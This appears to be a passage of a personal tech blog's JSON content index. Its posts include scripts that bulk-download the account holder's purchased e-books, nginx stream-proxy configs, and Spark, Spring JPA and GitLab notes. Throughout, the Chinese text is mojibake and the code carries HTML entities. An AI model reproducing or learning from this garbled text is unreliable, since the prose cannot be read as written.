è°¢è°¢","slug":"history/share/5b6ab95d43321ba758e2bd80","date":"2018-08-07T21:35:25.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/share/5b6ab95d43321ba758e2bd80/","link":"","permalink":"https://wangxiuwen.github.io/history/share/5b6ab95d43321ba758e2bd80/","excerpt":"","text":"","categories":[{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/categories/%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"share","slug":"share","permalink":"https://wangxiuwen.github.io/tags/share/"},{"name":"åˆ†äº«","slug":"åˆ†äº«","permalink":"https://wangxiuwen.github.io/tags/%E5%88%86%E4%BA%AB/"}],"author":"baipeng"},{"title":"æ‰¹é‡ä¸‹è½½å›¾çµå·²è´­å›¾ä¹¦ç”µå­ç‰ˆ","slug":"history/tech/5b6ab8ce43321ba758e2bd7f","date":"2018-08-07T21:33:02.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b6ab8ce43321ba758e2bd7f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b6ab8ce43321ba758e2bd7f/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137const puppeteer = require(&apos;puppeteer&apos;);const LOGIN_URL = &quot;http://account.ituring.com.cn/log-in&quot;const USERNAME_SELECTOR = &apos;#Email&apos;const PASSWORD_SELECTOR = &apos;#Password&apos;const LOGIN_BUTTON_SELECTOR = &apos;#loginForm &gt; form &gt; div:nth-child(6) &gt; div &gt; input&apos;const BOOKS_URL = &apos;http://www.ituring.com.cn/user/shelf&apos;const BOOK_SELECTOR = &apos;body &gt; div.container.page-box.my-profile &gt; div &gt; div.col-md-9.main &gt; div:nth-child(2) &gt; ul &gt; li &gt; div.book-img &gt; a&apos;const DOWNLOAD_SELECTOR = &apos;body &gt; div.container &gt; div &gt; div.col-md-3.pull-right.side &gt; ul &gt; li:nth-child(1) &gt; ul &gt; li:nth-child(2) &gt; a&apos;const username = &apos;å›¾çµè´¦å·&apos;const password = &apos;å›¾çµå¯†ç &apos;async function createBrowser() &#123; // root æƒé™ä¸‹éœ€è¦å–æ¶ˆsandbox // &apos;--incognito&apos; æœªå®ç° let chromeOptions = &#123; args: [&apos;--no-sandbox&apos;, &apos;--disable-setuid-sandbox&apos;], ignoreHTTPSErrors: true &#125; if(process.env.NODE_ENV == &quot;production&quot;) &#123; chromeOptions = Object.assign(&#123;&#125;, chromeOptions, &#123; headless: true &#125;) &#125; else &#123; chromeOptions = Object.assign(&#123;&#125;, chromeOptions, &#123; headless: false, devtools: true, &#125;) &#125; var browser = await puppeteer.launch(chromeOptions); return &#123; browser &#125;&#125;async function createContextAndPage(&#123;browser&#125;) &#123; browser = browser || __browser var context = await browser.createIncognitoBrowserContext(); var page = await context.newPage(); await page.setDefaultNavigationTimeout(120 * 1000) if(process.env.NODE_ENV == &quot;production&quot;) &#123; &#125; else &#123; await page.setViewport(&#123; width: 1366, height: 768 &#125;) &#125; return &#123; context, page &#125;&#125;class Utils &#123; static timeout(delay) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; try &#123; resolve(1) &#125; catch (e) &#123; reject(0) &#125; &#125;, delay) &#125;) &#125;&#125;;(async ()=&gt;&#123; var &#123; browser &#125; = await createBrowser() var &#123; context, page &#125; = await createContextAndPage(&#123;browser&#125;) try&#123; // ç™»å½• await page.goto(LOGIN_URL) await page.type(USERNAME_SELECTOR, username) await page.type(PASSWORD_SELECTOR, password) await Promise.all([ page.click(LOGIN_BUTTON_SELECTOR), page.waitForNavigation(&#123; timeout: 10000 &#125;) ]); // è·³è½¬ ä¹¦ç±åˆ—è¡¨é¡µ await page.goto(BOOKS_URL) // è·å–ä¹¦ç±åˆ—è¡¨ let bookUrls = await page.$$eval(BOOK_SELECTOR, lis =&gt; &#123; return lis.map(li =&gt; &#123; return li.href; &#125;) &#125;); var result = [] for(let i = 0; i&lt; bookUrls.length; ++i) &#123; let bookUrl = bookUrls[i] console.log(bookUrl , &quot;\\n&quot;) await page.goto(bookUrl) await Utils.timeout(3000) let title = await page.title() try&#123; let downloadUrl = await page.$eval(DOWNLOAD_SELECTOR, item =&gt; item.href); console.log(&quot;downloadUrl: &quot;, downloadUrl , &quot;\\n&quot;) await page.goto(downloadUrl) await Utils.timeout(10000) result.push(&#123; title: title, bookUrl: bookUrl, error: &apos;&apos;, downloadUrl: downloadUrl &#125;) &#125; catch(err) &#123; console.log(&quot;error: &quot;, err) result.push(&#123; title: title, bookUrl: bookUrl, error: err.message, downloadUrl: &apos;&apos; &#125;) &#125; &#125; &#125; catch(err) &#123; &#125; finally &#123; // await browser.close() console.log(result) &#125;&#125;)()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ‰¹é‡ä¸‹è½½å¼‚æ­¥ç¤¾åŒºçš„ç”µå­ä¹¦","slug":"history/tech/5b6ab7a543321ba758e2bd7e","date":"2018-08-07T21:28:05.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b6ab7a543321ba758e2bd7e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b6ab7a543321ba758e2bd7e/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687const request = require(&apos;request&apos;);const Promise = require(&quot;bluebird&quot;);const httpGET = Promise.promisify(request.get);// const sleep = require(&apos;sleep&apos;);const fs = require(&apos;fs&apos;);const headers = &#123; &apos;Accept-Language&apos;: &apos;zh-cn&apos;, Host: &quot;www.epubit.com&quot;, Referer: &quot;https://www.epubit.com/m/center/book&quot;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=utf-8&apos;, accept: &apos;application/json, text/plain, */*&apos;, Cookie: &apos;æ­¤å¤„å¡«å†™ä½ è‡ªå·±çš„cookie&apos;, &apos;user-agent&apos;: &apos;Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1&apos;,&#125;async function getPdfList(page) &#123; var options = &#123; method: &apos;GET&apos;, url: &apos;https://www.epubit.com/order/getBookshelf?page=&apos; + page + &apos;&amp;rows=10&amp;goodsType=0&apos;, headers: headers &#125;; let ret = await httpGET(options); let body = JSON.parse(ret.body); // sum = sum + body.total; return body.data;&#125;/** * * @param &#123;*&#125; url * @param &#123;*&#125; filename * @param &#123;*&#125; callback */async function downloadFile(url, filename, callback) &#123; var stream = fs.createWriteStream(filename); var options = &#123; method: &apos;GET&apos;, url: url, headers: headers &#125;; request(options).pipe(stream).on(&apos;close&apos;, callback);&#125;/** * * @param &#123;*&#125; list */async function pdfListDown(list) &#123; list.forEach(v =&gt; &#123; let pdfList = v.book.pdfList; console.log() if (pdfList.length &gt; 0) &#123; pdfList.forEach(v2 =&gt; &#123; if (v2.id) &#123; let name = v2.name; let downUrl = &apos;https://www.epubit.com/book/downEbook/&apos; + v2.id console.log(name, downUrl) downloadFile(downUrl, name, function(v) &#123; console.log(name + &quot; download is ok&quot;) &#125;) &#125; &#125;) &#125; &#125;);&#125;(async() =&gt; &#123; let flag = true; let page = 1; do &#123; let s = await getPdfList(page); console.log(s.rows.length); if (s.rows.length == 0) &#123; console.log(s) flag = false; &#125; else &#123; await pdfListDown(s.rows); page++; &#125; // sleep.sleep(10) &#125; while (flag);&#125;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"spring mvc requestBody json ä¸­å¤§å†™å‚æ•°æ¥å—","slug":"history/tech/5b601f5310b87dae1795b5a1","date":"2018-07-30T20:35:31.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b601f5310b87dae1795b5a1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b601f5310b87dae1795b5a1/","excerpt":"","text":"12 @JsonProperty(value = &quot;NAME&quot;)private string name;1é—®é¢˜æ˜¯java å¯¹è±¡çš„set get æ–¹æ³•é»˜è®¤ç”Ÿæˆçš„å­—æ®µä¸ºå°é©¼å³°æ ¼å¼ name","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"service mesh","slug":"history/tech/5b5e8d0510b87dae1795b5a0","date":"2018-07-30T03:59:01.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b5e8d0510b87dae1795b5a0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b5e8d0510b87dae1795b5a0/","excerpt":"","text":"https://github.com/servicemesher/meetup-slideshttp://shardingsphere.io/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®šæ—¶æ¸…ç†spark work ç›®å½•","slug":"history/tech/5b5e83e410b87dae1795b59f","date":"2018-07-30T03:20:04.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b5e83e410b87dae1795b59f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b5e83e410b87dae1795b59f/","excerpt":"","text":"ä½¿ç”¨spark standaloneæ¨¡å¼æ‰§è¡Œä»»åŠ¡ï¼Œæ¯æäº¤ä¸€æ¬¡ä»»åŠ¡ï¼Œåœ¨æ¯ä¸ªèŠ‚ç‚¹workç›®å½•ä¸‹éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ€ç»ˆå¯¼è‡´ spark work ç›®å½•å ç”¨è¿‡å¤šï¼Œç£ç›˜æŠ¥è­¦12345vim spark-env.shexport SPARK_WORKER_OPTS=&quot; -Dspark.worker.cleanup.enabled=true # æ˜¯å¦å¼€å¯è‡ªåŠ¨æ¸…ç†-Dspark.worker.cleanup.interval=60 # æ¸…ç†å‘¨æœŸï¼Œæ¯éš”å¤šé•¿æ—¶é—´æ¸…ç†ä¸€æ¬¡ï¼Œå•ä½ç§’-Dspark.worker.cleanup.appDataTtl=60&quot; # ä¿ç•™æœ€è¿‘å¤šé•¿æ—¶é—´çš„æ•°æ®","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cubase æƒ…ç»ªå¤„ç†","slug":"history/music/5b56f3df10b87dae1795b59e","date":"2018-07-23T21:39:43.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5b56f3df10b87dae1795b59e/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5b56f3df10b87dae1795b59e/","excerpt":"","text":"","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"wangxiuwen"},{"title":"ä»¥å¤ªåŠæ‰€ç”¨çš„å¯†ç å­¦","slug":"history/tech/5b559d5510b87dae1795b59d","date":"2018-07-22T21:18:13.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b559d5510b87dae1795b59d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b559d5510b87dae1795b59d/","excerpt":"","text":"1secp256k11234ECDH è¿ªè²ï¼èµ«å°”æ›¼(ECDH)ç®—æ³•æ˜¯ä¸ªé‡è¦åŠ å¯†å­¦æŠ€æœ¯ï¼Œå¯ä»¥ç”¨ç§é’¥å’Œå¯¹æ–¹å…¬é’¥è®¡ç®—å‡ºä¸€ä¸ªå…±äº«çš„å¯†é’¥ï¼Œæ¯”å¦‚æœ‰ Aã€B ä¸¤ä¸ªå…¬ç§é’¥å¯¹ï¼ŒECDH(Aç§é’¥, Bå…¬é’¥) == ECDH(Bç§é’¥, Aå…¬é’¥)ã€‚æ˜¯äº¤æ¢å¯†é’¥çš„é‡ç‚¹åŸç†ã€‚1sha3","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://wangxiuwen.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"author":"baipeng"},{"title":"å°ç™½æœºå™¨å­¦æœŸç¬”è®°1 Surprise ä½¿ç”¨","slug":"history/tech/5b52c84510b87dae1795b59c","date":"2018-07-20T17:44:37.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b52c84510b87dae1795b59c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b52c84510b87dae1795b59c/","excerpt":"","text":"1Surprise python æ¨èç³»ç»Ÿåº“12å®‰è£… pip install Surprise`åŸºæœ¬ä½¿ç”¨12345678910111213141516171819202122232425262728293031323334353637# -*- coding: UTF-8 -*-from surprise import SVDfrom surprise import Datasetfrom surprise import evaluate, print_perf# è‡ªåŠ¨è½½å…¥movielens æ•°æ®é›†data = Dataset.load_builtin(&quot;ml-100k&quot;)# kæŠ˜äº¤å‰éªŒè¯data.split(n_folds=3)# è¯•ä¸€æŠŠSVDçŸ©é˜µåˆ†è§£algo = SVD()# åœ¨æ•°æ®é›†ä¸Šæµ‹è¯•ä¸€ä¸‹æ•ˆæœperf = evaluate(algo, data, measures=[&apos;RMSE&apos;, &apos;MAE&apos;])#è¾“å‡ºç»“æœprint_perf(perf)RMSE: 0.9454MAE: 0.7450------------Fold 2RMSE: 0.9411MAE: 0.7429------------Fold 3RMSE: 0.9431MAE: 0.7429------------------------Mean RMSE: 0.9432Mean MAE : 0.7436------------------------ Fold 1 Fold 2 Fold 3 Mean RMSE 0.9454 0.9411 0.9431 0.9432 MAE 0.7450 0.7429 0.7429 0.7436 PyDev console: starting.1234567891011121314151617181920212223242526272829303132333435363738# æ‰‹åŠ¨è½½å…¥æ•°æ®é›†ï¼ŒæŒ‡å®šæ–‡ä»¶æ‰€åœ¨ä½ç½®file_path = os.path.expanduser(&apos;~/.surprise_data/ml-100k/ml-100k/u.data&apos;)reader = Reader(line_format=&apos;user item rating timestamp&apos;, sep=&apos;\\t&apos;)data = Dataset.load_from_file(file_path, reader)data.split(n_folds=5)algo = SVD()pref = evaluate(algo, data, measures=[&apos;rmse&apos;, &apos;mae&apos;])#è¾“å‡ºç»“æœprint_perf(pref)RMSE: 0.9335MAE: 0.7383------------Fold 2RMSE: 0.9409MAE: 0.7396------------Fold 3RMSE: 0.9331MAE: 0.7339------------Fold 4RMSE: 0.9352MAE: 0.7361------------Fold 5RMSE: 0.9416MAE: 0.7422------------------------Mean RMSE: 0.9369Mean MAE : 0.7380------------","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"Surprise","slug":"Surprise","permalink":"https://wangxiuwen.github.io/tags/Surprise/"}],"author":"baipeng"},{"title":"ç»Ÿè®¡å½“å‰æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°","slug":"history/tech/5b4c5d3538d664aa7949c9b4","date":"2018-07-15T20:54:13.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b4c5d3538d664aa7949c9b4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b4c5d3538d664aa7949c9b4/","excerpt":"","text":"ç»Ÿè®¡å½“å‰æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„ls -lR|grep &quot;^-&quot;|wc -l ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„ls -lR|grep &quot;^d&quot;|wc -l ç»Ÿè®¡å½“å‰æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°ls -l |grep &quot;^-&quot;|wc -l ç»Ÿè®¡å½“å‰æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•°ls -l |grep &quot;^d&quot;|wc -l é™„ï¼šç»Ÿè®¡è¾“å‡ºä¿¡æ¯çš„è¡Œæ•°wc -l å°†é•¿åˆ—è¡¨è¾“å‡ºä¿¡æ¯è¿‡æ»¤ä¸€éƒ¨åˆ†ï¼Œåªä¿ç•™ä¸€èˆ¬æ–‡ä»¶ï¼Œå¦‚æœåªä¿ç•™ç›®å½•å°±æ˜¯ ^dgrep &quot;^-&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æ‘˜æŠ„","slug":"æ‘˜æŠ„","permalink":"https://wangxiuwen.github.io/tags/%E6%91%98%E6%8A%84/"}],"author":"wangxiuwen"},{"title":"Spring Boot Jpa  save äº‹åŠ¡ä¸­å°å‘","slug":"history/tech/5b4483c739b4fc3a2f3396a1","date":"2018-07-09T22:00:39.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b4483c739b4fc3a2f3396a1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b4483c739b4fc3a2f3396a1/","excerpt":"","text":"12345678åœ¨äº‹åŠ¡ä¸­å¤„ç†ä¸¤æ¡æ•°æ®äº’æ¢å”¯ä¸€ç´¢å¼•çš„é—®é¢˜ã€‚MySQL è¯­å¥å¯ä»¥æ‰§è¡Œã€‚BEGIN;update t_test as s set s.t1 = &apos;121121212&apos; where s.r_id = 1;update t_test as s set s.t1 = &apos;15921445301&apos; where s.r_id = 2;COMMIT;åœ¨é¡¹ç›®ä¸­é¢‘é¢‘å‡ºç°ï¼Œå”¯ä¸€ç´¢å¼•å†²çªã€‚æœ€åé”å®šåˆ° jpa çš„save å’Œ saveAndFlushçš„åŒºåˆ«1234567891011save æ˜¯ä¸€ç§æ‡’åŠ è½½çš„æ–¹å¼ï¼Œç›´åˆ° flushæˆ– commitå‘å‡ºå‘½ä»¤æ‰ä¼šä¿å­˜åˆ°æ•°æ®åº“ @Transactional public &lt;S extends T&gt; S save(S entity) &#123; if (entityInformation.isNew(entity)) &#123; em.persist(entity); return entity; &#125; else &#123; return em.merge(entity); &#125; &#125;12345678910111213saveAndFlush ä¼šç›´æ¥flush() ä¿å­˜åˆ°æ•°æ®åº“ /* * (non-Javadoc) * @see org.springframework.data.jpa.repository.JpaRepository#saveAndFlush(java.lang.Object) */ @Transactional public &lt;S extends T&gt; S saveAndFlush(S entity) &#123; S result = save(entity); flush(); return result; &#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://wangxiuwen.github.io/tags/SpringBoot/"},{"name":"SpringJpa","slug":"SpringJpa","permalink":"https://wangxiuwen.github.io/tags/SpringJpa/"}],"author":"baipeng"},{"title":"æ— äººæœºåŸºç¡€çŸ¥è¯†","slug":"history/tech/5b42cce139b4fc3a2f3396a0","date":"2018-07-09T02:48:01.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b42cce139b4fc3a2f3396a0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b42cce139b4fc3a2f3396a0/","excerpt":"","text":"åœ°é¢ç«™:QgroundControl Mission Planner åè®®ï¼šMavlinkåè®® å…¶å®ƒ:http://ardupilot.org/dev/docs/apsync-intro.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go vendor åŒ…ç®¡ç†ä½¿ç”¨","slug":"history/tech/5b3ecac739b4fc3a2f33969f","date":"2018-07-06T01:49:59.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b3ecac739b4fc3a2f33969f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b3ecac739b4fc3a2f33969f/","excerpt":"","text":"govendorç®€ä»‹golangå·¥ç¨‹çš„ä¾èµ–åŒ…ç»å¸¸ä½¿ç”¨go getå‘½ä»¤æ¥è·å–ï¼Œä¾‹å¦‚ï¼šgo get github.com/kardianos/govendor ï¼Œä¼šå°†ä¾èµ–åŒ…ä¸‹è½½åˆ°GOPATHçš„è·¯å¾„ä¸‹ã€‚å¸¸ç”¨çš„ä¾èµ–åŒ…ç®¡ç†å·¥å…·æœ‰godepï¼Œgovendorç­‰ï¼Œåœ¨Golang1.5ä¹‹åï¼ŒGoæä¾›äº† GO15VENDOREXPERIMENT ç¯å¢ƒå˜é‡(Go 1.6ç‰ˆæœ¬é»˜è®¤å¼€å¯è¯¥ç¯å¢ƒå˜é‡)ï¼Œç”¨äºå°†go buildæ—¶çš„åº”ç”¨è·¯å¾„æœç´¢è°ƒæ•´æˆä¸º å½“å‰é¡¹ç›®ç›®å½•/vendor ç›®å½•æ–¹å¼ã€‚é€šè¿‡è¿™ç§å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ç±»ä¼¼äº godep æ–¹å¼çš„é¡¹ç›®ä¾èµ–ç®¡ç†ã€‚å®‰è£…1go get -u -v github.com/kardianos/govendorä½¿ç”¨1cd /home/workbase/è‡ªå·±çš„é¡¹ç›®åˆå§‹åŒ–123æ›´å¤šä½¿ç”¨å¯ä»¥æŸ¥çœ‹githubåœ°å€govendor initä½¿ç”¨å‘½ä»¤å°†åŒ…ç§»åŠ¨åˆ°vendorç›®å½•1govendor add +external æˆ–ä½¿ç”¨ç¼©å†™ï¼š govendor add +e","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"go","slug":"go","permalink":"https://wangxiuwen.github.io/tags/go/"},{"name":"vendor","slug":"vendor","permalink":"https://wangxiuwen.github.io/tags/vendor/"}],"author":"baipeng"},{"title":"img.convert('L')","slug":"history/tech/5b39debf5bf8e4f86e557e20","date":"2018-07-01T20:13:51.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b39debf5bf8e4f86e557e20/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b39debf5bf8e4f86e557e20/","excerpt":"","text":"ä¸€å¼ å½©è‰²å›¾ç‰‡ç»è¿‡å‡½æ•°np.array(img.convert(â€˜Lâ€™))ä¹‹åçš„ç»´åº¦å’Œåƒç´ å€¼æ˜¯å¤šå°‘ï¼Ÿ11ï¼›[0, 255]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cifar10å’Œ cifar 100 æ•°æ®é›†","slug":"history/tech/5b347efc5bf8e4f86e557e1f","date":"2018-06-27T18:23:56.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b347efc5bf8e4f86e557e1f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b347efc5bf8e4f86e557e1f/","excerpt":"","text":"http://www.cs.toronto.edu/~kriz/cifar.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nginx ä»£ç† mysqlï¼Œredisï¼Œ ssh","slug":"history/tech/5b33132f5bf8e4f86e557e1e","date":"2018-06-27T04:31:43.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b33132f5bf8e4f86e557e1e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b33132f5bf8e4f86e557e1e/","excerpt":"","text":"nginx.conf:123stream &#123; include /etc/nginx/stream.d/*.conf;&#125;/etc/nginx/stream.d/mysql.conf:123456789upstream cloudsocket &#123; hash $remote_addr consistent; server 192.168.1.111:3306 weight=5 max_fails=3 fail_timeout=30s;&#125;server &#123; listen 3306; proxy_connect_timeout 10s; proxy_pass cloudsocket;&#125;redis:123456789upstream rediscloudsocket &#123; hash $remote_addr consistent; server 192.168.11.111:6379 weight=5 max_fails=3 fail_timeout=30s;&#125;server &#123; listen 6379; proxy_connect_timeout 10s; proxy_pass rediscloudsocket;&#125;ssh:123456789upstream ssh &#123; server 192.168.11.112:22;&#125;server &#123;listen 80;proxy_pass ssh;proxy_connect_timeout 1h;proxy_timeout 1h;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gitlab å¤‡ä»½æ¢å¤æ“ä½œ","slug":"history/tech/5b3207885bf8e4f86e557e1d","date":"2018-06-25T21:29:44.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5b3207885bf8e4f86e557e1d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5b3207885bf8e4f86e557e1d/","excerpt":"","text":"å¤‡ä»½ï¼š1gitlab-rake gitlab:backup:createæ¢å¤:1234gitlab-ctl stop unicorngitlab-ctl stop sidekiqgitlab-ctl statusgitlab-rake gitlab:backup:restore BACKUP=xxxrepositories å¯¼å…¥å…¶å®ƒç‰ˆæœ¬ï¼š1gitlab-rake --trace gitlab:import:repos[&apos;/var/opt/gitlab/git-data/repositories&apos;] docker-compose.yml æ–‡ä»¶:12345678910111213141516171819gitlab: image: 